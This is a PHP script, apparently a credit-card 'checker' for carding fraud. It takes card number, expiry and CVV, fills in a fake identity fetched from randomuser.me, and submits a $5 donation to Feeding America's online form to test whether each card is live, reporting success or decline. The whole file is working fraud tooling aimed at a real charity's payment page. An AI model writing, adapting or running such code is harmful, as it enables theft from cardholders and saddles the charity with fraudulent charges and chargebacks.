<?php
set_time_limit(0);

if ($_SERVER["REQUEST_METHOD"] == "POST") {

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}
$card = $_POST['cc'];
$is = $_POST['is'];
 

$cc = multiexplode(array(":", "|", ""), $card)[0];
$mes = multiexplode(array(":", "|", ""), $card)[1];
$ano = multiexplode(array(":", "|", ""), $card)[2];
$cvv = multiexplode(array(":", "|", ""), $card)[3];

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$state_list = array('AL'=>"Alabama",  
    'AK'=>"Alaska",  
    'AZ'=>"Arizona",  
    'AR'=>"Arkansas",  
    'CA'=>"California",  
    'CO'=>"Colorado",  
    'CT'=>"Connecticut",  
    'DE'=>"Delaware",  
    'DC'=>"District Of Columbia",  
    'FL'=>"Florida",  
    'GA'=>"Georgia",  
    'HI'=>"Hawaii",  
    'ID'=>"Idaho",  
    'IL'=>"Illinois",  
    'IN'=>"Indiana",  
    'IA'=>"Iowa",  
    'KS'=>"Kansas",  
    'KY'=>"Kentucky",  
    'LA'=>"Louisiana",  
    'ME'=>"Maine",  
    'MD'=>"Maryland",  
    'MA'=>"Massachusetts",  
    'MI'=>"Michigan",  
    'MN'=>"Minnesota",  
    'MS'=>"Mississippi",  
    'MO'=>"Missouri",  
    'MT'=>"Montana",
    'NE'=>"Nebraska",
    'NV'=>"Nevada",
    'NH'=>"New Hampshire",
    'NJ'=>"New Jersey",
    'NM'=>"New Mexico",
    'NY'=>"New York",
    'NC'=>"North Carolina",
    'ND'=>"North Dakota",
    'OH'=>"Ohio",  
    'OK'=>"Oklahoma",  
    'OR'=>"Oregon",  
    'PA'=>"Pennsylvania",  
    'RI'=>"Rhode Island",  
    'SC'=>"South Carolina",  
    'SD'=>"South Dakota",
    'TN'=>"Tennessee",  
    'TX'=>"Texas",  
    'UT'=>"Utah",  
    'VT'=>"Vermont",  
    'VA'=>"Virginia",  
    'WA'=>"Washington",  
    'WV'=>"West Virginia",  
    'WI'=>"Wisconsin",  
    'WY'=>"Wyoming");

$ch1 = curl_init();
curl_setopt($ch1, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
$user = json_decode(curl_exec($ch1), JSON_PRETTY_PRINT); 

$first = isset($user["results"][0]["name"]["first"]) ? $user["results"][0]["name"]["first"] : "karim" ;
$last = isset($user["results"][0]["name"]["last"]) ? $user["results"][0]["name"]["last"] : "mansour" ;
$email = isset($user["results"][0]["email"]) ? $user["results"][0]["email"] : "karimmansour77@gmail.com" ;

$number = isset($user["results"][0]["location"]["street"]["number"]) ? $user["results"][0]["location"]["street"]["number"] : "327" ;
$name = isset($user["results"][0]["location"]["street"]["name"]) ? $user["results"][0]["location"]["street"]["name"] : "Timber Wolf Trail" ;
$address = $number ." ". $name ;

$postcode = isset($user["results"][0]["location"]["postcode"]) ? $user["results"][0]["location"]["postcode"] : 70887 ;
$city = isset($user["results"][0]["location"]["city"]) ? $user["results"][0]["location"]["city"] : "Fresno" ;
$state = isset($user["results"][0]["location"]["state"]) ? array_search($user["results"][0]["location"]["state"], $state_list) : "Or" ;
$country = isset($user["results"][0]["location"]["country"]) ? $user["results"][0]["location"]["country"] : "United States" ;


$ch2 = curl_init();
curl_setopt($ch2, CURLOPT_URL, "https://secure.feedingamerica.org/site/Donation2");
curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch2, CURLOPT_HEADER, 0);
curl_setopt($ch2, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);

curl_setopt($ch2, CURLOPT_POSTFIELDS, "user_donation_amt=%245.00&company_min_matching_amt=&currency_locale=en_US&variationhidden=&referrerhidden=&onsite_promohidden=MainNav_Donate&keywordhidden=&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpanded=40368&level_standardexpanded40368amount=%245&level_standardexpandedsubmit=true&level_standardsubmit=true&level_standardauto_repeatsubmit=true&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typesubmit=true&billing_first_namename={$first}&billing_first_namesubmit=true&billing_last_namename={$last}&billing_last_namesubmit=true&billing_addr_street1name={$address}&billing_addr_street1submit=true&billing_addr_street2name=&billing_addr_street2submit=true&billing_addr_cityname={$city}&billing_addr_citysubmit=true&billing_addr_state={$state}&billing_addr_statesubmit=true&billing_addr_zipname={$postcode}&billing_addr_zipsubmit=true&billing_addr_country={$country}&billing_addr_countrysubmit=true&donor_email_addressname={$email}&donor_email_addresssubmit=true&gift_on_behalf_of_companysubmit=true&company_or_organization_name_input=&company_or_organization_namesubmit=true&gift-ref=&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername={$cc}&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH={$mes}&responsive_payment_typecc_exp_date_YEAR={$ano}&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname={$cvv}&responsive_payment_typecc_cvvsubmit=true&idb=57664980&df_id=25431&mfc_pref=T&browser_input=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F90.0.4430.212+Safari%2F537.36&browsersubmit=true&lightbox_choicehidden=nolightbox-onetime&paypal_transactionidhidden=&paypal_billingplanidhidden=&paypalxc_initialsustaininghidden=&25431.donation=form1&pstep_finish=Submit");

$result2 = curl_exec($ch2);


if(curl_error($ch2))
{
    $status = "failed" ;
    $data = curl_error($ch2) ;
}
else {      
    // if($result2 != null && $result2 != "" && substr($result2 , 0 , 1) == "{"){
      if($result2 != null && $result2 != ""){
           //$msg =  getStr($result2, '<span class="field-error-text">', '</span>' );
           if(strpos("The credit card was declined" , $result2) < 0){
               $status = "success" ;
               $data = "check" ;
           }else{
            $status = "failed" ;
            $data = "The credit card was declined" ;
        
           }

        }else {
            $status = "failed" ;
            $data = "nothing" ;
        }

}

echo json_encode(array("status" => $status , "data" => $data) , JSON_UNESCAPED_UNICODE);


 }